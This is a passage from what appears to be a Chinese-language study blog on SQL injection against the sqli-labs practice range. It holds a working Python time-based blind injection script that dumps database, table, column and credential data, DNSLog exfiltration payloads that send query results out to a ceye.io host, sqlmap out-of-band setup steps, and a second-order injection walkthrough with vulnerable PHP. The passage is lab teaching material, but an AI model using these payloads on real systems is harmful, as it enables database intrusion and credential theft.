inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>注意：</p>\n<p>在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容</p>\n<p>在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数</p>\n<p>但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’='1 闭合，但 or 会有 and 和 or 优先级问题。</p>\n<p>mysql 中 and 优先级 高级 or</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>dumb’ and  if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) and ‘1’='1</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) or ‘1’='1</p>\n<p>或者使用 bool 盲注</p>\n<p>判断是否存在 flag.jpg</p>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<p>1. 安装 DNS 服务器</p>\n<p>2. 添加正向查找区域</p>\n<p>区域名称为 oupeng.top</p>\n<p>3.DNS 属性中启动递归，启用简单和递归查询</p>\n<p>4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP</p>\n<p>5. 正向查找新建泛解析，地址为 sqlmapip</p>\n<p>6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址</p>\n<p>7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址</p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png\" alt=\"image-20221020163942115\"></p>\n<p>点击下一步，勾选 dns 服务器，其他选项全部默认即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png\" alt=\"image-20221020164020385\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png\" alt=\"image-20221020164223367\"></p>\n<p>关闭禁用递归，开启简单和递归查询</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png\" alt=\"image-20221020164251704\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png\" alt=\"image-20221020164324361\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png\" alt=\"image-20221020164355711\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png\" alt=\"image-20221020164422616\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png\" alt=\"image-20221020164445444\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png\" alt=\"image-20221020164512708\"></p>\n<p>添加转发，dns 域随便写什么，但 IP 攻击机的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png\" alt=\"image-20221020164603923\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&quot; --technique=T --dns-domain &quot;hahaha.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=\">搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=\">使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)</span></p>\n<p>如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机</p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = 